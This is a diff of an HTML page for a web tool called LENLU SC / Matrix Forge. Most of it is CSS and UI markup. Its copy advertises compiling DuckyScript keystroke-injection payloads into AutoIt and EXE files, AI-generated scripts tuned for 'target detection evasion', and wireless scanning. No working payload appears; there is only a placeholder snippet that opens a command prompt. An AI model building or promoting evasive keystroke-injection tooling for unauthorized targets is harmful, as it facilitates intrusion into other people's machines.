@@ -7,6 +7,9 @@
   
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/ScrollTrigger.min.js"></script>
   
   <style>
     /* =========================================
@@ -201,7 +204,7 @@
     }
     .tag:hover, .tag.active { background: var(--matrix-glow); color: #000; }
 
-    /* Tools */
+    /* Scanners */
     .tool-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 1rem; }
     .tool-card {
       background: rgba(0,0,0,0.5); border: 1px solid var(--glass-border);
@@ -220,15 +223,552 @@
     .log-err { color: var(--cyber-red); }
     .log-success { color: var(--matrix-glow); font-weight: bold; }
 
+    /* Matrix Modal Styles */
+    .matrix-modal {
+      position: fixed; inset: 0; z-index: 20000; background: rgba(0,0,0,0.9);
+      display: none; align-items: center; justify-content: center; backdrop-filter: blur(5px);
+    }
+    .modal-content { width: 400px; text-align: center; border: 1px solid var(--matrix-glow) !important; animation: fadeIn 0.3s ease; }
+    .modal-footer { margin-top: 1.5rem; display: flex; gap: 1rem; justify-content: center; }
+
+    /* Boot Terminal Overlay */
+    #bootTerminal {
+      position: fixed; inset: 0; z-index: 10001; background: #000;
+      display: none; flex-direction: column; padding: 2rem; font-family: var(--font-mono);
+      color: var(--matrix-glow); overflow: hidden;
+    }
+    .boot-line { margin-bottom: 5px; border-left: 2px solid var(--matrix-glow); padding-left: 10px; opacity: 0; transform: translateX(-10px); animation: lineReveal 0.2s forwards; }
+    @keyframes lineReveal { to { opacity: 1; transform: translateX(0); } }
+
     /* Animations */
     @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
     @keyframes pulse-red { 0% { box-shadow: 0 0 0 0 rgba(255,0,60,0.4); } 70% { box-shadow: 0 0 0 20px rgba(255,0,60,0); } 100% { box-shadow: 0 0 0 0 rgba(255,0,60,0); } }
     @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+    /* =========================================
+       CINEMATIC MATRIX FORGE REDESIGN
+       ========================================= */
+    :root {
+      --steel-0: #020403;
+      --steel-1: #070b08;
+      --steel-2: #101611;
+      --steel-3: #1a221c;
+      --white-hot: #f4fff8;
+      --soft-copy: #a9b8ad;
+      --amber: #d7a947;
+      --danger: #ff3456;
+      --panel-shadow: 0 24px 80px rgba(0,0,0,0.55), inset 0 1px 0 rgba(255,255,255,0.05);
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      min-height: 100vh;
+      height: auto;
+      overflow: hidden;
+      background:
+        radial-gradient(circle at 70% 12%, rgba(0,255,65,0.12), transparent 32rem),
+        radial-gradient(circle at 18% 78%, rgba(215,169,71,0.08), transparent 26rem),
+        linear-gradient(135deg, #010201 0%, #060a07 45%, #000 100%);
+      color: var(--white-hot);
+    }
+
+    #forgeWebgl {
+      position: fixed;
+      inset: 0;
+      z-index: 1;
+      pointer-events: none;
+      opacity: 0.92;
+    }
+
+    #matrixCanvas { z-index: 2; opacity: 0.22; mix-blend-mode: screen; }
+
+    .crt-overlay {
+      z-index: 9000;
+      opacity: 0.22;
+      background:
+        linear-gradient(rgba(255,255,255,0.025) 50%, rgba(0,0,0,0.18) 50%),
+        radial-gradient(circle at center, transparent 42%, rgba(0,0,0,0.78));
+      background-size: 100% 3px, 100% 100%;
+    }
+
+    #appContainer {
+      min-height: 100vh;
+      height: 100vh;
+      background: linear-gradient(180deg, rgba(0,0,0,0.16), rgba(0,0,0,0.78));
+    }
+
+    .top-nav {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      padding: 0.85rem clamp(1rem, 3vw, 2.4rem);
+      background: rgba(2, 6, 3, 0.68);
+      border-bottom: 1px solid rgba(0,255,65,0.18);
+      box-shadow: 0 16px 70px rgba(0,0,0,0.45);
+    }
+
+    .brand {
+      color: var(--white-hot);
+      font-size: clamp(1.05rem, 2vw, 1.55rem);
+      letter-spacing: 0.18em;
+      text-shadow: 0 0 18px rgba(0,255,65,0.55);
+      white-space: nowrap;
+    }
+
+    .brand::after {
+      content: "BLACKBOX FORGE";
+      color: var(--matrix-glow);
+      border-left: 1px solid rgba(0,255,65,0.35);
+      padding-left: 0.8rem;
+      margin-left: 0.2rem;
+      font-size: 0.64rem;
+      letter-spacing: 0.22em;
+      opacity: 0.9;
+    }
+
+    .brand img {
+      width: 34px;
+      height: 34px;
+      object-fit: contain;
+      filter: drop-shadow(0 0 12px rgba(0,255,65,0.9));
+    }
+
+    .nav-links { gap: 0.55rem; flex-wrap: wrap; justify-content: flex-end; }
+
+    .nav-btn,
+    .btn-matrix,
+    .btn-outline {
+      border-radius: 2px;
+      min-height: 40px;
+      background: linear-gradient(180deg, rgba(14,24,17,0.78), rgba(0,0,0,0.72));
+      border: 1px solid rgba(0,255,65,0.26);
+      color: #baffc9;
+      box-shadow: inset 0 1px 0 rgba(255,255,255,0.04);
+    }
+
+    .nav-btn:hover,
+    .nav-btn.active,
+    .btn-matrix:hover {
+      color: #001704;
+      background: linear-gradient(180deg, #aaffbd, var(--matrix-glow));
+      box-shadow: 0 0 24px rgba(0,255,65,0.35), inset 0 1px 0 rgba(255,255,255,0.5);
+      transform: translateY(-1px);
+    }
+
+    .main-content {
+      position: relative;
+      z-index: 20;
+      overflow-y: auto;
+      height: calc(100vh - 69px);
+      padding: 0;
+      gap: 0;
+    }
+
+    .view-section {
+      min-height: calc(100vh - 69px);
+      height: auto;
+      padding: clamp(1rem, 3vw, 2rem);
+    }
+
+    .view-section.active { gap: clamp(1rem, 2vw, 1.5rem); }
+
+    .glass-card,
+    .tool-card,
+    .input-matrix,
+    .terminal-log,
+    .code-area {
+      background:
+        linear-gradient(135deg, rgba(12,18,14,0.88), rgba(0,0,0,0.78)),
+        repeating-linear-gradient(90deg, rgba(255,255,255,0.025) 0 1px, transparent 1px 9px);
+      border: 1px solid rgba(0,255,65,0.18);
+      box-shadow: var(--panel-shadow);
+      backdrop-filter: blur(16px);
+    }
+
+    .glass-card {
+      border-radius: 6px;
+      overflow: hidden;
+    }
+
+    .glass-card::after,
+    .story-panel::after,
+    .project-card::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      background: linear-gradient(115deg, transparent 0%, rgba(255,255,255,0.045) 38%, transparent 58%);
+      transform: translateX(-130%);
+      transition: transform 0.8s ease;
+    }
+
+    .glass-card:hover::after,
+    .story-panel:hover::after,
+    .project-card:hover::after { transform: translateX(130%); }
+
+    .card-header {
+      color: var(--white-hot);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+
+    .code-area {
+      border-radius: 4px;
+      line-height: 1.55;
+      color: #c9ffe0;
+    }
+
+    .terminal-log {
+      border-radius: 4px;
+      color: #9af7b0;
+    }
+
+    #view-studio {
+      display: none;
+      padding: 0;
+      overflow: hidden;
+    }
+
+    #view-studio.active { display: block; }
+
+    .studio-shell {
+      position: relative;
+      min-height: calc(100vh - 69px);
+    }
+
+    .hero-forge {
+      min-height: calc(100vh - 69px);
+      display: grid;
+      grid-template-columns: minmax(0, 1.15fr) minmax(300px, 0.85fr);
+      align-items: center;
+      gap: clamp(2rem, 6vw, 6rem);
+      padding: clamp(5rem, 9vw, 8rem) clamp(1.2rem, 5vw, 5rem) clamp(3rem, 6vw, 5rem);
+    }
+
+    .eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.75rem;
+      color: var(--matrix-glow);
+      font-size: 0.78rem;
+      letter-spacing: 0.22em;
+      text-transform: uppercase;
+      margin-bottom: 1.25rem;
+    }
+
+    .eyebrow::before {
+      content: "";
+      width: 42px;
+      height: 1px;
+      background: var(--matrix-glow);
+      box-shadow: 0 0 12px var(--matrix-glow);
+    }
+
+    .hero-title {
+      max-width: 980px;
+      font-family: var(--font-display);
+      font-size: clamp(3.2rem, 10vw, 9.5rem);
+      line-height: 0.82;
+      letter-spacing: 0;
+      text-transform: uppercase;
+      color: var(--white-hot);
+      text-shadow: 0 0 28px rgba(0,255,65,0.34), 0 4px 24px rgba(0,0,0,0.85);
+    }
+
+    .hero-title span {
+      display: block;
+      color: transparent;
+      -webkit-text-stroke: 1px rgba(0,255,65,0.9);
+      text-shadow: 0 0 34px rgba(0,255,65,0.38);
+    }
+
+    .hero-copy {
+      max-width: 720px;
+      margin-top: 1.4rem;
+      color: #d7e4da;
+      font-size: clamp(1rem, 1.6vw, 1.18rem);
+      line-height: 1.8;
+      text-shadow: 0 2px 16px rgba(0,0,0,0.95);
+    }
+
+    .hero-actions {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.85rem;
+      margin-top: 2rem;
+    }
+
+    .forge-btn {
+      min-height: 48px;
+      border-radius: 2px;
+      border: 1px solid rgba(0,255,65,0.5);
+      background: rgba(0,0,0,0.58);
+      color: var(--matrix-glow);
+      padding: 0.85rem 1.05rem;
+      font-family: var(--font-mono);
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      cursor: pointer;
+      transition: var(--transition);
+    }
+
+    .forge-btn.primary {
+      background: linear-gradient(180deg, #c5ffd0, var(--matrix-glow));
+      color: #001704;
+      box-shadow: 0 0 32px rgba(0,255,65,0.28);
+    }
+
+    .forge-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 0 28px rgba(0,255,65,0.34);
+    }
+
+    .hero-console {
+      position: relative;
+      min-height: 520px;
+      padding: 1rem;
+      border: 1px solid rgba(0,255,65,0.22);
+      background:
+        radial-gradient(circle at 50% 20%, rgba(0,255,65,0.12), transparent 38%),
+        linear-gradient(145deg, rgba(14,18,15,0.82), rgba(0,0,0,0.66));
+      box-shadow: var(--panel-shadow), 0 0 80px rgba(0,255,65,0.12);
+      overflow: hidden;
+    }
+
+    .hero-console::before {
+      content: "";
+      position: absolute;
+      inset: 11px;
+      border: 1px solid rgba(255,255,255,0.06);
+      pointer-events: none;
+    }
+
+    .console-grid {
+      position: absolute;
+      inset: 0;
+      background:
+        linear-gradient(rgba(0,255,65,0.06) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,65,0.06) 1px, transparent 1px);
+      background-size: 42px 42px;
+      transform: perspective(700px) rotateX(58deg) translateY(80px);
+      transform-origin: bottom;
+      opacity: 0.65;
+    }
+
+    .console-readout {
+      position: absolute;
+      left: 1.4rem;
+      right: 1.4rem;
+      bottom: 1.4rem;
+      padding: 1rem;
+      background: rgba(0,0,0,0.84);
+      border: 1px solid rgba(0,255,65,0.18);
+      color: var(--soft-copy);
+      font-size: 0.82rem;
+      line-height: 1.7;
+    }
+
+    .metric-strip {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 1px;
+      background: rgba(0,255,65,0.16);
+      border-top: 1px solid rgba(0,255,65,0.18);
+      border-bottom: 1px solid rgba(0,255,65,0.18);
+    }
+
+    .metric {
+      padding: 1.25rem clamp(1rem, 3vw, 3rem);
+      background: rgba(0,0,0,0.76);
+    }
+
+    .metric strong {
+      display: block;
+      color: var(--white-hot);
+      font-family: var(--font-display);
+      font-size: clamp(1.5rem, 4vw, 3.6rem);
+    }
+
+    .metric span {
+      color: var(--matrix-glow);
+      font-size: 0.74rem;
+      letter-spacing: 0.18em;
+      text-transform: uppercase;
+    }
+
+    .story-section {
+      padding: clamp(4rem, 8vw, 7rem) clamp(1.2rem, 5vw, 5rem);
+      background: linear-gradient(180deg, rgba(0,0,0,0.1), rgba(0,0,0,0.7));
+      border-top: 1px solid rgba(0,255,65,0.12);
+    }
+
+    .section-kicker {
+      color: var(--matrix-glow);
+      font-size: 0.78rem;
+      letter-spacing: 0.22em;
+      text-transform: uppercase;
+      margin-bottom: 0.8rem;
+    }
+
+    .section-title {
+      max-width: 860px;
+      font-family: var(--font-display);
+      font-size: clamp(2.2rem, 6vw, 5.6rem);
+      line-height: 0.95;
+      color: var(--white-hot);
+      text-transform: uppercase;
+      margin-bottom: 1.4rem;
+    }
+
+    .section-copy {
+      max-width: 780px;
+      color: #d2ddd5;
+      line-height: 1.8;
+    }
+
+    .service-grid,
+    .project-grid,
+    .about-grid,
+    .contact-grid {
+      display: grid;
+      gap: 1rem;
+      margin-top: 2rem;
+    }
+
+    .service-grid { grid-template-columns: repeat(4, minmax(0, 1fr)); }
+    .project-grid { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+    .about-grid { grid-template-columns: 1.1fr 0.9fr; align-items: stretch; }
+    .contact-grid { grid-template-columns: 0.9fr 1.1fr; align-items: stretch; }
+
+    .story-panel,
+    .project-card {
+      position: relative;
+      min-height: 260px;
+      padding: 1.25rem;
+      background:
+        linear-gradient(145deg, rgba(14,22,16,0.88), rgba(0,0,0,0.78)),
+        repeating-linear-gradient(135deg, rgba(255,255,255,0.03) 0 1px, transparent 1px 10px);
+      border: 1px solid rgba(0,255,65,0.16);
+      box-shadow: var(--panel-shadow);
+      overflow: hidden;
+      transition: transform 0.35s ease, border-color 0.35s ease, box-shadow 0.35s ease;
+    }
+
+    .story-panel:hover,
+    .project-card:hover {
+      transform: translateY(-8px);
+      border-color: rgba(0,255,65,0.42);
+      box-shadow: var(--panel-shadow), 0 0 40px rgba(0,255,65,0.14);
+    }
+
+    .story-panel i,
+    .project-card i {
+      color: var(--matrix-glow);
+      font-size: 1.6rem;
+      margin-bottom: 1.2rem;
+    }
+
+    .story-panel h3,
+    .project-card h3 {
+      color: var(--white-hot);
+      font-family: var(--font-display);
+      font-size: 1.55rem;
+      text-transform: uppercase;
+      margin-bottom: 0.85rem;
+    }
+
+    .story-panel p,
+    .project-card p,
+    .contact-line {
+      color: var(--soft-copy);
+      line-height: 1.7;
+      font-size: 0.94rem;
+    }
+
+    .project-card {
+      min-height: 360px;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+    }
+
+    .project-card::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background:
+        radial-gradient(circle at 24% 24%, rgba(0,255,65,0.22), transparent 20%),
+        linear-gradient(135deg, transparent 0 45%, rgba(0,255,65,0.11) 45% 47%, transparent 47%),
+        linear-gradient(rgba(0,255,65,0.08) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,65,0.08) 1px, transparent 1px);
+      background-size: auto, auto, 34px 34px, 34px 34px;
+      opacity: 0.6;
+    }
+
+    .project-card > * { position: relative; z-index: 1; }
+
+    .contact-terminal {
+      min-height: 360px;
+      padding: 1.25rem;
+      background: rgba(0,0,0,0.78);
+      border: 1px solid rgba(0,255,65,0.22);
+      box-shadow: var(--panel-shadow);
+    }
+
+    .contact-terminal .terminal-log {
+      height: 100%;
+      min-height: 320px;
+      border: none;
+      background: transparent;
+      box-shadow: none;
+    }
+
+    #splashScreen {
+      background:
+        radial-gradient(circle at center, rgba(0,255,65,0.12), transparent 28rem),
+        linear-gradient(180deg, #000, #030603);
+    }
+
+    .splash-logo {
+      border: 1px solid rgba(0,255,65,0.22);
+      padding: 1rem;
+      background: rgba(0,0,0,0.55);
+    }
+
+    @media (max-width: 1100px) {
+      .hero-forge,
+      .about-grid,
+      .contact-grid { grid-template-columns: 1fr; }
+      .service-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+      .project-grid { grid-template-columns: 1fr; }
+      .hero-console { min-height: 420px; }
+      .grid-2,
+      .ai-workspace { grid-template-columns: 1fr; height: auto; }
+      .grid-3 { grid-template-columns: 1fr; }
+    }
+
+    @media (max-width: 720px) {
+      .top-nav { align-items: flex-start; flex-direction: column; }
+      .nav-links { width: 100%; justify-content: flex-start; }
+      .nav-btn { flex: 1 1 calc(50% - 0.55rem); padding: 0.55rem 0.45rem; font-size: 0.72rem; }
+      .brand::after { display: none; }
+      .hero-forge { padding-top: 3rem; }
+      .hero-title { font-size: clamp(3rem, 17vw, 5.2rem); }
+      .service-grid,
+      .metric-strip { grid-template-columns: 1fr; }
+      .hero-actions { flex-direction: column; }
+      .forge-btn { width: 100%; }
+      .view-section { padding: 1rem; }
+      .card-header { align-items: flex-start; flex-direction: column; gap: 0.7rem; }
+    }
   </style>
 </head>
 <body>
 
   <canvas id="matrixCanvas"></canvas>
+  <div id="forgeWebgl" aria-hidden="true"></div>
   <div class="crt-overlay"></div>
 
   <div id="splashScreen">
@@ -239,46 +779,227 @@
     <button class="btn-matrix" style="margin-top: 2rem;" onclick="bootSystem()">ESTABLISH LINK</button>
   </div>
 
+  <div id="bootTerminal"></div>
+
+  <div id="matrixModal" class="matrix-modal">
+    <div class="modal-content glass-card">
+      <div class="card-header"><i class="fa-solid fa-terminal"></i> System Message</div>
+      <p id="modalMsg" style="margin: 1rem 0; line-height: 1.6;"></p>
+      <div id="modalCustomInput" style="display:none; margin-bottom: 1rem;">
+        <input type="text" id="modalInput" class="input-matrix" placeholder="Entity name...">
+      </div>
+      <div class="modal-footer">
+        <button class="btn-matrix" id="modalOk">CONFIRM</button>
+        <button class="btn-matrix btn-outline" id="modalCancel">DISCARD</button>
+      </div>
+    </div>
+  </div>
+
   <div id="appContainer">
     
     <nav class="top-nav">
       <div class="brand">
         <img src="IMGS/L%202.png" alt="Logo" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCI+PHJlY3Qgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiBmaWxsPSIjMDBmZjQxIi8+PC9zdmc+'">
-        LENLU
+        LENLU SC
       </div>
       <div class="nav-links">
-        <button class="nav-btn active" onclick="switchView('ide')"><i class="fa-solid fa-code"></i> IDE</button>
+        <button class="nav-btn" onclick="switchView('studio')"><i class="fa-solid fa-cube"></i> Studio</button>
+        <button class="nav-btn" onclick="switchView('ide')"><i class="fa-solid fa-code"></i> IDE</button>
         <button class="nav-btn" onclick="switchView('ai')"><i class="fa-solid fa-brain"></i> AI Generator</button>
-        <button class="nav-btn" onclick="switchView('tools')"><i class="fa-solid fa-network-wired"></i> Scanners</button>
+        <button class="nav-btn" onclick="switchView('scanners')"><i class="fa-solid fa-network-wired"></i> Scanners</button>
         <button class="nav-btn" onclick="switchView('settings')"><i class="fa-solid fa-gear"></i> Settings</button>
       </div>
     </nav>
 
     <main class="main-content">
+
+      <section id="view-studio" class="view-section active">
+        <div class="studio-shell">
+          <div class="hero-forge">
+            <div class="reveal-cinematic">
+              <div class="eyebrow">Encrypted creative systems</div>
+              <h1 class="hero-title">Matrix<span>Forge</span></h1>
+              <p class="hero-copy">
+                Establish direct link with the LENLU SC system core. Program keystroke injection payloads, orchestrate localized AI neural synthesis, trace target networks, and export secure diagnostic session profiles from a consolidated, hardware-accelerated command interface.
+              </p>
+              <div class="hero-actions">
+                <button class="forge-btn primary" onclick="switchView('ide')"><i class="fa-solid fa-bolt"></i> Open Compiler</button>
+                <button class="forge-btn" onclick="switchView('ai')"><i class="fa-solid fa-brain"></i> Launch AI Lab</button>
+                <button class="nav-btn active" onclick="window.location.href='studio.html'"><i class="fa-solid fa-cube"></i>Explore</button>
+              </div>
+            </div>
+
+            <div class="hero-console reveal-cinematic">
+              <img src="IMGS/L 1.png" alt="Console Glow" style="position:absolute; inset:0; width:100%; height:100%; object-fit:cover; opacity:0.28; pointer-events:none;">
+              <div class="console-grid"></div>
+              
+              <div class="console-readout">
+                <div class="log-success">[ONLINE] WebGL forge chamber rendering ambient particles.</div>
+                <div class="log-sys">[SYNC] Compiler, AI generator, scanner modules, settings vault.</div>
+                <div class="log-sys">[MODE] Tactical hacker workspace with localized telemetry.</div>
+                <div class="log-success">[READY] Select a module from navigation or continue the walkthrough.</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="metric-strip reveal-cinematic">
+            <div class="metric"><strong>04</strong><span>Live modules</span></div>
+            <div class="metric"><strong>3D</strong><span>Shader chamber</span></div>
+            <div class="metric"><strong>60</strong><span>FPS target</span></div>
+            <div class="metric"><strong>100%</strong><span>Responsive shell</span></div>
+          </div>
+
+          <section id="services" class="story-section">
+            <div class="section-kicker reveal-cinematic">// Services</div>
+            <h2 class="section-title reveal-cinematic">Modular sub-systems engineered for tactical automation.</h2>
+            <p class="section-copy reveal-cinematic">
+              Deploy modular sub-systems designed for precision operations. Whether you are translating keyboard payloads to native code, synthesizing stealth scripts via voice-activated neural models, scanning Bluetooth node tags, or exporting session logs, LENLU SC provides an integrated, responsive hacker-deck.
+            </p>
+            <div class="service-grid">
+              <article class="story-panel reveal-cinematic" onclick="switchView('ide')" style="cursor: pointer;">
+                <i class="fa-solid fa-code"></i>
+                <h3>Payload Compiler</h3>
+                <p>Translate human-readable DuckyScript keystroke injections into optimized, native AutoIt (.au3 &amp; .au4) assembly with real-time syntax checking.</p>
+              </article>
+              <article class="story-panel reveal-cinematic" onclick="switchView('ai')" style="cursor: pointer;">
+                <i class="fa-solid fa-microchip"></i>
+                <h3>Neural Synthesis</h3>
+                <p>Synthesizes advanced automation code using artificial intelligence and vocal speech patterns, customized for speed or target detection evasion.</p>
+              </article>
+              <article class="story-panel reveal-cinematic" onclick="switchView('scanners')" style="cursor: pointer;">
+                <i class="fa-solid fa-satellite-dish"></i>
+                <h3>Signal telemetry</h3>
+                <p>Run passive wireless sweeps, isolate Bluetooth Low Energy signal beacons, inspect 802.11 network names, and monitor deauthentication frames.</p>
+              </article>
+              <article class="story-panel reveal-cinematic" onclick="switchView('settings')" style="cursor: pointer;">
+                <i class="fa-solid fa-file-shield"></i>
+                <h3>Secure Vault</h3>
+                <p>Securely stash active scripts in the client-side browser database, download compiled binaries, and export audit-ready PDF logs.</p>
+              </article>
+            </div>
+          </section>
+
+          <section id="projects" class="story-section">
+            <div class="section-kicker reveal-cinematic">// Projects</div>
+            <h2 class="section-title reveal-cinematic">Instrument structures designed for operational control.</h2>
+            <div class="project-grid">
+              <article class="project-card reveal-cinematic">
+                <i class="fa-solid fa-terminal"></i>
+                <h3>Integrated Workbench</h3>
+                <p>A synchronized dual-pane IDE that links your keystroke editor directly to the compiler output screen and real-time syntax checking logs.</p>
+              </article>
+              <article class="project-card reveal-cinematic">
+                <i class="fa-solid fa-network-wired"></i>
+                <h3>Tactical Console</h3>
+                <p>A high-performance command deck consolidating Bluetooth scanner outputs, WiFi network listings, and local file storage controls.</p>
+              </article>
+              <article class="project-card reveal-cinematic">
+                <i class="fa-solid fa-cubes"></i>
+                <h3>WebGL Matrix Core</h3>
+                <p>An interactive WebGL backdrop that maps system interactions into a glowing green canvas of floating data particles and matrix text rain.</p>
+              </article>
+            </div>
+          </section>
+
+          <section id="about" class="story-section">
+            <div class="about-grid">
+              <div>
+                <div class="section-kicker reveal-cinematic">// About</div>
+                <h2 class="section-title reveal-cinematic">High-fidelity operational design.</h2>
+                <p class="section-copy reveal-cinematic">
+                  LENLU SC is built to elevate script compilation into a premium tactical cockpit experience. Featuring low-latency WebGL shaders, CSS glassmorphism, and live device telemetry, it converts standard compiler utilities into a cohesive workspace for security audits and automation.
+                </p>
+              </div>
+              <div class="story-panel reveal-cinematic">
+                <i class="fa-solid fa-gauge-high"></i>
+                <h3>Telemetry status</h3>
+                <p class="contact-line">WebGL Engine: ONLINE</p>
+                <p class="contact-line">Diagnostics Pipeline: CALIBRATED</p>
+                <p class="contact-line">Encrypted Storage: SYNCHRONIZED</p>
+                <p class="contact-line">Target Link Status: VERIFIED</p>
+              </div>
+            </div>
+          </section>
+
+          <section id="contact" class="story-section">
+            <div class="contact-grid">
+              <div>
+                <div class="section-kicker reveal-cinematic">// Contact</div>
+                <h2 class="section-title reveal-cinematic">Initialize telemetry uplink.</h2>
+                <p class="section-copy reveal-cinematic">
+                  Configure your custom neural API endpoints, fine-tune telemetry settings, or initiate localized wireless scanners. Access the main workbench to begin scripting payloads.
+                </p>
+                <div class="hero-actions reveal-cinematic">
+                  <button class="forge-btn primary" onclick="switchView('settings')"><i class="fa-solid fa-key"></i> Configure Keys</button>
+                  <button class="forge-btn" onclick="switchView('scanners')"><i class="fa-solid fa-radar"></i> Open Scanners</button>
+                </div>
+              </div>
+              <div class="contact-terminal reveal-cinematic">
+                <div class="terminal-log">
+                  <div class="log-success">root@matrix-forge:~$ handshake --secure</div>
+                  <div class="log-sys">Identity: LENLU SC / Cyber Assembly Grid</div>
+                  <div class="log-sys">Services: Code forge, AI lab, scanner wall, export vault</div>
+                  <div class="log-success">Transmission channel ready. Use the navigation to enter a module.</div>
+                </div>
+              </div>
+            </div>
+          </section>
+        </div>
+      </section>
       
-      <section id="view-ide" class="view-section active">
+      <section id="view-ide" class="view-section">
         <div class="grid-2" style="height: 100%;">
           
           <div class="glass-card" style="display: flex; flex-direction: column;">
             <div class="card-header">
               <span><i class="fa-solid fa-file-code"></i> payload.ds</span>
-              <button class="btn-matrix btn-outline" onclick="compilePipeline()"><i class="fa-solid fa-bolt"></i> Compile</button>
+              <div style="display: flex; gap: 0.5rem; align-items: center;">
+                <select id="templateSelector" class="btn-matrix btn-outline" style="padding: 2px 5px; font-size: 0.75rem; width: auto;" onchange="loadTemplate(this.value); this.value=''">
+                  <option value="" disabled selected>Templates</option>
+                  <!-- Populated by JS -->
+                </select>
+                <button class="btn-matrix btn-outline" onclick="promptSaveTemplate()" title="Save as Template" style="padding: 2px 8px;"><i class="fa-solid fa-save"></i></button>
+                <button class="btn-matrix btn-outline" onclick="compilePipeline()"><i class="fa-solid fa-bolt"></i> Compile</button>
+              </div>
             </div>
-            <textarea id="sourceEditor" class="code-area" placeholder="REM Write DuckyScript here...&#10;GUI r&#10;DELAY 500&#10;STRING cmd&#10;ENTER"></textarea>
+            <textarea id="sourceEditor" class="code-area" placeholder="REM Write DuckyScript here...&#10;GUI r&#10;DELAY 500&#10;STRING cmd&#10;ENTER" oninput="localStorage.setItem('lenlu_editor_code', this.value)"></textarea>
           </div>
 
           <div style="display: flex; flex-direction: column; gap: 1.5rem;">
             <div class="glass-card" style="flex: 1; display: flex; flex-direction: column;">
               <div class="card-header">
                 <span><i class="fa-solid fa-microchip"></i> assembly.au3</span>
-                <div style="display:flex; gap:0.5rem;">
-                  <button class="btn-matrix btn-outline" onclick="copyAssembly()"><i class="fa-solid fa-copy"></i> Copy</button>
-                  <button class="btn-matrix btn-outline" onclick="downloadAu3()"><i class="fa-solid fa-download"></i> Save .au3</button>
-                  <button class="btn-matrix btn-outline" onclick="downloadAu4()"><i class="fa-solid fa-download"></i> Save .au4</button>
-                  <button class="btn-matrix btn-outline" onclick="downloadThemedPDF()"><i class="fa-solid fa-file-pdf"></i> Export PDF</button>
+                <div style="display:flex; flex-wrap:wrap; gap:0.5rem; justify-content: flex-end; align-items: center;">
+                  <span style="font-size: 0.7rem; color: var(--matrix-dim); text-transform: uppercase;">Export Format:</span>
+                  <div class="btn-group" style="display:flex; gap:2px;">
+                    <button class="btn-matrix btn-outline" onclick="downloadAu3()" title="AutoIt v3 Script" style="padding: 2px 6px;">AU3</button>
+                    <button class="btn-matrix btn-outline" onclick="downloadAu4()" title="AutoIt v4 Script" style="padding: 2px 6px;">AU4</button>
+                  </div>
+                  <div class="btn-group" style="display:flex; gap:2px; padding-left: 0.2rem;">
+                    <button class="btn-matrix" onclick="downloadExe('x86')" style="font-size: 0.7rem; padding: 2px 6px;">EXE x86</button>
+                    <button class="btn-matrix" onclick="downloadExe('x64')" style="font-size: 0.7rem; padding: 2px 6px;">EXE x64</button>
+                  </div>
+                  <div style="height: 15px; width: 1px; background: var(--matrix-dark); margin: 0 0.2rem;"></div>
+                  <button class="btn-matrix btn-outline" onclick="showHistory()" title="View Compilation History" style="padding: 2px 8px;"><i class="fa-solid fa-clock-rotate-left"></i> History</button>
+                  <button class="btn-matrix btn-outline" onclick="downloadThemedPDF()" style="padding: 2px 8px;"><i class="fa-solid fa-file-pdf"></i> PDF</button>
                 </div>
               </div>
-              <textarea id="outputViewer" class="code-area" readonly style="color: var(--cyber-cyan);"></textarea>
+              <div style="position: relative; flex: 1; display: flex; flex-direction: column;">
+                <button class="btn-matrix btn-outline" onclick="copyAssembly()" style="position: absolute; top: 10px; right: 10px; padding: 4px 8px; font-size: 0.7rem; background: rgba(0,0,0,0.6); z-index: 10;">
+                  <i class="fa-solid fa-copy"></i> Copy
+                </button>
+                <textarea id="outputViewer" class="code-area" readonly style="color: var(--cyber-cyan); flex: 1; width: 100%;"></textarea>
+              </div>
+            </div>
+
+            <div id="historyPanel" class="glass-card" style="display:none; max-height: 300px; overflow-y: auto;">
+              <div class="card-header" style="font-size: 1rem;">
+                <span><i class="fa-solid fa-history"></i> Compilation History</span>
+                <button class="btn-matrix btn-outline" onclick="closeHistory()" style="padding: 2px 8px;">×</button>
+              </div>
+              <div id="historyList" style="display: flex; flex-direction: column; gap: 0.5rem;">
+                <div class="log-sys" style="text-align: center; padding: 1rem;">// No compilation records found in local memory.</div>
+              </div>
             </div>
 
             <div class="glass-card">
@@ -295,8 +1016,11 @@
         <div class="ai-workspace">
           
           <div class="glass-card ai-controls">
-            <div class="card-header"><i class="fa-solid fa-wand-magic-sparkles"></i> AI Architect</div>
             
+            <button class="btn-matrix btn-outline" onclick="showPopover('aiInfo')" style="margin-bottom: 1rem;">
+              <i class="fa-solid fa-wand-magic-sparkles">LENLU ASG</i>
+            <p style="font-size: 0.75rem; color: var(--matrix-dim); margin-top: 0.2rem;">  Generate payloads using natural language and voice commands.</p>
+            </button>
             <div style="text-align: center;">
